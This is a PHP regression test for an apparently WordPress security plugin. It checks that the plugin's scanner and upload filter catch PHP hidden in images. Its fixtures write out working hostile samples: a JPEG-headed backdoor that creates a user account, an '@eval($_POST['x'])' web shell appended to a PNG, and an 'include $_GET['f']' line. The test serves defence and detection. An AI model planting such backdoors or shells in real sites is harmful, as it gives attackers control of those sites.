<?php
/**
 * Regression test for PHP hidden in pictures (1.4.166).
 *
 * Run from the command line only:  php tests/test-media-php.php
 *
 * Recovered from a live site's uploads folder: a 2,306-byte file named like a photo, a valid JPEG
 * header whose comment segment is `<?php`, then a key-gated script that created an administrator,
 * published posts and deleted itself. No check saw it. This builds a synthetic file of the same
 * shape (no real key, no real host) and runs the real code over it, with near-miss controls.
 */
if ( PHP_SAPI !== 'cli' ) {
	exit( 1 );
}

$tmp = sys_get_temp_dir() . '/wps-media-' . bin2hex( random_bytes( 4 ) );
foreach ( [ '/plugins/wps-self', '/mu-plugins', '/uploads', '/themes', '/site' ] as $d ) {
	mkdir( $tmp . $d, 0777, true );
}
define( 'ABSPATH', $tmp . '/site/' );
define( 'WPS_DIR', $tmp . '/plugins/wps-self/' );
define( 'WPS_OPTION', 'wps_opts' );
define( 'WP_PLUGIN_DIR', $tmp . '/plugins' );
define( 'WPMU_PLUGIN_DIR', $tmp . '/mu-plugins' );
define( 'WP_CONTENT_DIR', $tmp );
define( 'MINUTE_IN_SECONDS', 60 );
define( 'HOUR_IN_SECONDS', 3600 );
define( 'DAY_IN_SECONDS', 86400 );

$GLOBALS['opts']    = [ 'quarantine_enabled' => '0' ];
$GLOBALS['options'] = [];
function get_option( $k, $d = false ) {
	if ( 'wps_opts' === $k ) {
		return $GLOBALS['opts'];
	}
	return array_key_exists( $k, $GLOBALS['options'] ) ? $GLOBALS['options'][ $k ] : $d;
}
function update_option() { return true; }
function delete_option() { return true; }
function get_transient() { return false; }
function set_transient() { return true; }
function delete_transient() { return true; }
function apply_filters( $t, $v ) { return $v; }
function wp_json_encode( $v ) { return json_encode( $v ); }
function wp_upload_dir() { return [ 'basedir' => $GLOBALS['tmp'] . '/uploads', 'baseurl' => '/', 'error' => false ]; }
foreach ( [ 'add_action', 'add_filter' ] as $fn ) {
	eval( "function $fn() {}" );
}
function sanitize_file_name( $s ) { return preg_replace( '/[^A-Za-z0-9._-]/', '-', (string) $s ); }
function wp_unslash( $v ) { return $v; }
function sanitize_text_field( $s ) { return trim( strip_tags( (string) $s ) ); }
function is_admin() { return false; }
function wp_doing_ajax() { return false; }
function is_user_logged_in() { return false; }
function sanitize_key( $s ) { return strtolower( preg_replace( '/[^a-z0-9_\-]/i', '', (string) $s ) ); }
function current_user_can() { return false; }
class WPS_Logger {
	public static $events = [];
	public static function log_event( $t, $d = '', $ip = '' ) { self::$events[] = [ $t, $d ]; }
	public static function write() {}
	public static function notify_admin() {}
}
$GLOBALS['tmp'] = $tmp;

$root = dirname( __DIR__ ) . '/includes/';
foreach ( [ 'wps-utils', 'wps-indicators', 'remediation-policy', 'scanner', 'blocker' ] as $c ) {
	require $root . "class-$c.php";
}

$fail = 0;
function check( string $name, bool $ok, string $detail = '' ): void {
	global $fail;
	echo ( $ok ? 'PASS ' : 'FAIL ' ) . $name . ( $ok ? '' : ' :: ' . $detail ) . "\n";
	if ( ! $ok ) {
		++$fail;
	}
}
function put( string $p, string $c ): void {
	@mkdir( dirname( $p ), 0777, true );
	file_put_contents( $p, $c );
}
function run( string $method ): array {
	$m = new ReflectionMethod( 'WPS_Scanner', $method );
	$m->setAccessible( true );
	return $m->invoke( null );
}
function by( array $f, string $needle ): array {
	return array_values( array_filter( $f, static fn( $x ) => false !== strpos( (string) ( $x['path'] ?? '' ), $needle ) ) );
}

// A real, valid 1x1 PNG.
$png = base64_decode( 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==' );
// The shape of the recovered file: JPEG start-of-image, a JFIF header, a comment segment holding PHP.
$jpeg_head = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xFE\x05\x00";
$backdoor  = "<?php\n\$p='k1'; if(!isset(\$_GET[\$p])){http_response_code(404);exit;}\n\$k=isset(\$_GET['k'])?\$_GET['k']:'';\nif(!hash_equals('0000000000000000',\$k)){exit;}\ndefine('WP_USE_THEMES',false); include \$_SERVER['DOCUMENT_ROOT'].'/wp-load.php';\n\$uid=wp_create_user('someone',wp_generate_password(20),'a@example.com');\nexit;\n";
$tail_pad  = str_repeat( "\x00", 600 ) . "\xFF\xD9";

put( $tmp . '/uploads/2026/photo.jpg', $jpeg_head . $backdoor . $tail_pad );
put( $tmp . '/uploads/2026/real.png', $png );
put( $tmp . '/uploads/2026/real.jpg', "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" . random_bytes( 4000 ) . "\xFF\xD9" );
// PHP appended after a large picture: only the tail reveals it.
put( $tmp . '/uploads/2026/big.png', $png . random_bytes( 400000 ) . "\n<?php @eval(\$_POST['x']); ?>" );
// A bare open tag followed by readable words, no code.
put( $tmp . '/uploads/2026/note.jpg', $jpeg_head . "<?php this is only a note about the file and has nothing in it to run" . $tail_pad );
// Compressed-looking noise that happens to contain the three bytes `<?=`.
put( $tmp . '/uploads/2026/noise.webp', "RIFF" . random_bytes( 20000 ) . "<?=" . random_bytes( 20000 ) );
// The picture-sized PHP in a plugin's own images folder.
put( $tmp . '/plugins/someplug/assets/logo.png', $png . "\n<?php include \$_GET['f'];" );

$f = run( 'check_media_with_php' );

$a = by( $f, '/photo.jpg' );
check( 'a JPEG-headed backdoor is critical and removable', 1 === count( $a ) && 'critical' === $a[0]['severity'] && ! empty( $a[0]['auto_delete'] ) && $a[0]['delete_path'] === $a[0]['path'], json_encode( $a ) );
check( 'PHP appended to the tail of a large picture is found', 1 === count( by( $f, '/big.png' ) ) && 'critical' === by( $f, '/big.png' )[0]['severity'] );
check( 'a plugin\'s own image folder is searched too', 1 === count( by( $f, '/someplug/assets/logo.png' ) ) );
check( 'a real PNG is not reported', ! by( $f, '/real.png' ) );
check( 'a real JPEG full of random bytes is not reported', ! by( $f, '/real.jpg' ) );
check( 'three coincidental bytes `<?=` in image noise are not reported', ! by( $f, '/noise.webp' ), json_encode( by( $f, '/noise.webp' ) ) );
$n = by( $f, '/note.jpg' );
check( 'a bare open tag with readable text is review only', 1 === count( $n ) && 'high' === $n[0]['severity'] && empty( $n[0]['auto_delete'] ), json_encode( $n ) );

// The removal policy lets the scanner act on the confirmed finding, and not on the review one.
check( 'the removal policy allows the confirmed finding', true === WPS_Remediation_Policy::decide( $a[0] )['allowed'], json_encode( WPS_Remediation_Policy::decide( $a[0] ) ) );

// Blank PHP stubs in uploads.
put( $tmp . '/uploads/blank0.php', '' );
put( $tmp . '/uploads/blank1.php', '<?php error_reporting(0);' );
put( $tmp . '/uploads/blank2.php', "<?php\n// nothing here\n@ini_set('display_errors', 0);\n" );
put( $tmp . '/uploads/live.php', "<?php\necho 'hello';\n" );
put( $tmp . '/uploads/index.php', "<?php\n// Silence is golden.\n" );
$u = run( 'check_uploads_for_php' );
foreach ( [ 'blank0.php', 'blank1.php', 'blank2.php' ] as $b ) {
	$r = by( $u, '/' . $b );
	check( "$b (empty or error-silencing only) is removable", 1 === count( $r ) && ! empty( $r[0]['auto_delete'] ) && 'Blank PHP file in uploads directory' === $r[0]['type'], json_encode( $r ) );
}
$r = by( $u, '/blank1.php' );
check( 'the removal policy allows a blank stub', true === WPS_Remediation_Policy::decide( $r[0] )['allowed'], json_encode( WPS_Remediation_Policy::decide( $r[0] ) ) );
$r = by( $u, '/live.php' );
check( 'a PHP file that does something is review only', 1 === count( $r ) && empty( $r[0]['auto_delete'] ), json_encode( $r ) );
check( 'the standard silence stub is left alone', ! by( $u, '/uploads/index.php' ) );

// The upload ban: a zip carrying the picture, or the backdoor's own markers, is refused.
$mkzip = static function ( array $entries ) use ( $tmp ): array {
	$zp = $tmp . '/z-' . bin2hex( random_bytes( 3 ) ) . '.zip';
	$z  = new ZipArchive();
	$z->open( $zp, ZipArchive::CREATE );
	foreach ( $entries as $name => $c ) {
		$z->addFromString( $name, $c );
	}
	$z->close();
	return [ 'name' => 'plugin.zip', 'tmp_name' => $zp ];
};
$iz = new ReflectionMethod( 'WPS_Blocker', 'inspect_zip_for_malware' );
$iz->setAccessible( true );
check( 'a zip carrying the JPEG-headed backdoor is refused', '' !== $iz->invoke( null, $mkzip( [ 'p/p.php' => "<?php\n// ok\n", 'p/img/photo.jpg' => $jpeg_head . $backdoor . $tail_pad ] ) ) );
check( 'a zip carrying only real pictures passes', '' === $iz->invoke( null, $mkzip( [ 'p/p.php' => "<?php\n// ok\n", 'p/img/logo.png' => $png ] ) ) );
check( 'the backdoor\'s ping reply in any text file is refused', '' !== $iz->invoke( null, $mkzip( [ 'p/p.php' => "<?php\n// ok\n", 'p/notes.txt' => 'reply ' . 'OKC3C' . '274' ] ) ) );

// The upload filter refuses the picture before it is saved.
$bf = new ReflectionMethod( 'WPS_Blocker', 'block_zip_upload' );
check( 'block_zip_upload exists for the picture check', $bf->isPublic() );
$_SERVER['REMOTE_ADDR'] = '203.0.113.5';
put( $tmp . '/up-bad.jpg', $jpeg_head . $backdoor . $tail_pad );
put( $tmp . '/up-good.png', $png );
$bad  = WPS_Blocker::block_zip_upload( [ 'name' => 'holiday.jpg', 'tmp_name' => $tmp . '/up-bad.jpg' ] );
$good = WPS_Blocker::block_zip_upload( [ 'name' => 'holiday.png', 'tmp_name' => $tmp . '/up-good.png' ] );
check( 'an upload of the JPEG-headed backdoor is refused', ! empty( $bad['error'] ) && false !== stripos( $bad['error'], 'PHP' ), json_encode( $bad ) );
check( 'an upload of a real picture is accepted', empty( $good['error'] ), json_encode( $good ) );

// cleanup
$it = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $tmp, FilesystemIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );
foreach ( $it as $x ) {
	$x->isDir() ? @rmdir( $x->getPathname() ) : @unlink( $x->getPathname() );
}
@rmdir( $tmp );

echo $fail ? "\n$fail FAILED\n" : "\nAll passed\n";
exit( $fail ? 1 : 0 );
